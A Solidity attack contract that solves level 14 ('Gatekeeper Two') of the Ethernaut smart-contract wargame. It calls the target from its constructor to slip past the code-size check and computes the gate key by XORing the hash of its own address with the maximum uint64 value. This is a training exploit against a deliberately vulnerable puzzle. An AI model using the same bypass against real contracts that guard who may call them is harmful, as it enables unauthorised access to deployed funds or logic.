// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IGatekeeperTwo.sol";

/**
 * @title Gatekeeper Two Attack (Ethernaut Challenge Level 14 - Gatekeeper Two)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 14
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d
 */
contract GatekeeperTwoAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @param target Address of target contract
     */
    constructor(IGatekeeperTwo target) {
        require(
            target.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max)),
            "GatekeeperTwo: Wrong res"
        );

        require(msg.sender == target.entrant(), "GatekeeperTwo: Attack failed");
    }
}
